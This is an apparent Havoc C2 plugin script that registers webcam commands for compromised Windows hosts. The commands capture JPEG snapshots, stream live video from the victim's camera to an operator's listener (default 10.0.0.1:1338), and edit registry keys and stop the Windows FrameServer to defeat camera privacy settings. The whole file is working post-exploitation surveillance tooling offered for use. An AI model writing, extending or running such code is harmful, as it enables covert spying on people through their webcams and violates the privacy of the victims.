"""UVC webcam BOFs for Havoc-compatible Script Manager.

webcam snap|listen|stream|checkin|on|off|help
"""
from havoc import Demon, RegisterCommand

try:
    from havoc import RegisterModule
except ImportError:
    def RegisterModule(*_a, **_k):
        return None
import os
import socket
import subprocess
import sys
import time


def _arch(demon):
    a = (demon.ProcessArch or "x64").lower()
    return "x86" if a in ("x86", "i386", "i686", "32") else "x64"


def _capture_dir():
    env = os.environ.get("UVC_BOF")
    cands = []
    if env:
        cands.append(env)
    try:
        cands.append(os.path.dirname(os.path.abspath(__file__)))
    except (NameError, TypeError):
        pass
    cands.append(os.path.expanduser("~/github/uvc-bof"))
    for d in cands:
        if d and os.path.isfile(os.path.join(d, "ObjectFiles", "WebcamStream.x64.o")):
            return d
        if d and os.path.isfile(os.path.join(d, "webcam-view.py")):
            return d
    return os.path.dirname(os.path.abspath(__file__)) if "__file__" in dir() else os.getcwd()


def _lhost():
    try:
        raw = subprocess.check_output(["ip", "-4", "-br", "a"], text=True)
        ranked = []
        for line in raw.splitlines():
            parts = line.split()
            if len(parts) < 3 or parts[0] == "lo" or parts[0].startswith("lo:"):
                continue
            for cidr in parts[2:]:
                ip = cidr.split("/")[0]
                if ip.startswith("127.") or ip.startswith("172.17."):
                    continue
                score = 9
                if ip.startswith("192.168."):
                    score = 1
                elif ip.startswith("10."):
                    score = 2
                ranked.append((score, ip))
        if ranked:
            ranked.sort()
            return ranked[0][1]
    except Exception:
        pass
    return "127.0.0.1"


def _listening(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.25)
    try:
        return s.connect_ex(("127.0.0.1", int(port))) == 0
    except OSError:
        return False
    finally:
        try:
            s.close()
        except OSError:
            pass


def _spawn_view(port):
    port = int(port)
    if _listening(port):
        return True
    view = os.path.join(_capture_dir(), "webcam-view.py")
    if not os.path.isfile(view):
        return False
    env = dict(os.environ)
    env["DISPLAY"] = env.get("DISPLAY") or ":0"
    log = "/tmp/uvc-bof-view.log"
    with open(log, "ab") as fh:
        subprocess.Popen(
            [sys.executable, view, "--port", str(port)],
            env=env,
            stdout=fh,
            stderr=subprocess.STDOUT,
            start_new_session=True,
        )
    for _ in range(25):
        time.sleep(0.12)
        if _listening(port):
            return True
    return _listening(port)


def webcam(demonID, *param):
    demon = Demon(demonID)
    path = param[0] if param else r"C:\Users\Public\webcam.jpg"
    method = 0
    if len(param) > 1:
        try:
            method = int(param[1])
        except ValueError:
            demon.ConsoleWrite(demon.CONSOLE_ERROR, "method must be 0 (disk)")
            return False
    if method != 0:
        demon.ConsoleWrite(demon.CONSOLE_INFO, "Havoc/mop: method 0 (disk) only; ignoring %d" % method)
        method = 0
    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, "webcam snap -> %s" % path)
    packer = Packer()
    packer.addstr(path)
    packer.addint(method)
    demon.InlineExecute(TaskID, "go", "ObjectFiles/WebcamBOF.%s.o" % _arch(demon), packer.getbuffer(), False)
    return TaskID


def webcam_listen(demonID, *param):
    demon = Demon(demonID)
    port = 1338
    if param:
        try:
            port = int(param[0])
        except ValueError:
            demon.ConsoleWrite(demon.CONSOLE_ERROR, "port must be int")
            return False
    if _spawn_view(port):
        demon.ConsoleWrite(
            demon.CONSOLE_INFO,
            "webcam window LISTEN :%d  then: webcam-stream %s %d" % (port, _lhost(), port),
        )
        return True
    demon.ConsoleWrite(demon.CONSOLE_ERROR, "failed to open webcam-view.py on DISPLAY=:0")
    return False


def webcam_stream(demonID, *param):
    demon = Demon(demonID)
    host = _lhost()
    port = 1338
    quality = 55
    interval = 200
    args = list(param)
    if args:
        host = args[0]
    if len(args) > 1:
        try:
            port = int(args[1])
        except ValueError:
            demon.ConsoleWrite(demon.CONSOLE_ERROR, "invalid port")
            return False
    if len(args) > 2:
        try:
            quality = int(args[2])
        except ValueError:
            pass
    if len(args) > 3:
        try:
            interval = int(args[3])
        except ValueError:
            pass
    if not _spawn_view(port):
        demon.ConsoleWrite(
            demon.CONSOLE_ERROR,
            "no viewer on :%d — python3 webcam-view.py --port %d" % (port, port),
        )
        return False
    obj = "ObjectFiles/WebcamStream.%s.o" % _arch(demon)
    TaskID = demon.ConsoleWrite(
        demon.CONSOLE_TASK,
        "webcam-stream %s:%d q=%d ms=%d  (close Kali window to stop)" % (host, port, quality, interval),
    )
    packer = Packer()
    packer.addstr(host)
    packer.addint(port)
    packer.addint(quality)
    packer.addint(interval)
    # CoffeeRunner thread so Demon still check-ins while go() loops
    demon.InlineExecute(TaskID, "go", obj, packer.getbuffer(), True)
    return TaskID


def _prep(demonID, op, label):
    demon = Demon(demonID)
    obj = os.path.join(_capture_dir(), "ObjectFiles", "WebcamPrep.%s.o" % _arch(demon))
    if not os.path.isfile(obj):
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "missing %s" % obj)
        return False
    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, label)
    packer = Packer()
    packer.addint(op)
    demon.InlineExecute(TaskID, "go", obj, packer.getbuffer(), False)
    return TaskID


def webcam_checkin(demonID, *param):
    return _prep(demonID, 0, "webcam-checkin")


def webcam_on(demonID, *param):
    return _prep(demonID, 1, "webcam-on")


def webcam_off(demonID, *param):
    return _prep(demonID, 2, "webcam-off")


_WEBCAM_HELP = (
    ("snap",     "[path]",                         "JPEG on disk (also: webcam)"),
    ("listen",   "[port]",                         "Kali window, TCP listen (default 1338)"),
    ("stream",   "[host] [port] [quality] [ms]",   "live MJPG to that window (HiddenDesktop-style)"),
    ("checkin",  "",                               "privacy / FrameServer / KS — what is missing"),
    ("on",       "",                               "Allow + FrameServerMode=0, stop FrameServer"),
    ("off",      "",                               "revert those keys, start FrameServer"),
    ("help",     "",                               "this list"),
)


def webcam_help(demonID, *param):
    demon = Demon(demonID)
    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, "webcam help")
    demon.ConsoleWrite(demon.CONSOLE_INFO, "webcam  USB camera")
    demon.ConsoleWrite(demon.CONSOLE_INFO, "  command     args                              description")
    demon.ConsoleWrite(demon.CONSOLE_INFO, "  ----------- --------------------------------- -----------")
    for cmd, args, desc in _WEBCAM_HELP:
        line = "  %-11s %-33s %s" % (cmd, args, desc)
        demon.ConsoleWrite(demon.CONSOLE_INFO, line)
    demon.ConsoleWrite(demon.CONSOLE_INFO, "aliases: webcam | webcam-listen | webcam-stream | webcam-checkin | webcam-on | webcam-off | webcam-help")
    demon.ConsoleWrite(demon.CONSOLE_INFO, "Interact:  help webcam   |   webcam on")
    return TaskID


RegisterModule(
    "webcam",
    "USB camera: snap, live stream, privacy on/off",
    "API Only",
    "[snap|listen|stream|checkin|on|off|help]",
    "help webcam",
    "",
)

RegisterCommand(webcam, "webcam", "snap", "JPEG on disk", 0, "[path]", r"C:\Users\Public\webcam.jpg")
RegisterCommand(webcam_listen, "webcam", "listen", "Kali window, TCP listen", 0, "[port]", "1338")
RegisterCommand(webcam_stream, "webcam", "stream", "live MJPG to Kali window", 0, "[host] [port] [quality] [ms]", "10.0.0.1 1338")
RegisterCommand(webcam_checkin, "webcam", "checkin", "privacy/FrameServer/KS — what is missing", 0, "", "")
RegisterCommand(webcam_on, "webcam", "on", "Allow + FrameServerMode=0, stop FrameServer", 0, "", "")
RegisterCommand(webcam_off, "webcam", "off", "revert registry, start FrameServer", 0, "", "")
RegisterCommand(webcam_help, "webcam", "help", "list webcam commands", 0, "", "")

RegisterCommand(webcam, "", "webcam", "JPEG on disk (webcam snap)", 0, "[path]", r"C:\Users\Public\webcam.jpg")
RegisterCommand(webcam_listen, "", "webcam-listen", "Kali window, TCP listen", 0, "[port]", "1338")
RegisterCommand(webcam_stream, "", "webcam-stream", "live MJPG to Kali window", 0, "[host] [port] [quality] [ms]", "10.0.0.1 1338")
RegisterCommand(webcam_checkin, "", "webcam-checkin", "privacy/FrameServer/KS — what is missing", 0, "", "")
RegisterCommand(webcam_on, "", "webcam-on", "Allow + FrameServerMode=0, stop FrameServer", 0, "", "")
RegisterCommand(webcam_off, "", "webcam-off", "revert registry, start FrameServer", 0, "", "")
RegisterCommand(webcam_help, "", "webcam-help", "list webcam commands", 0, "", "")


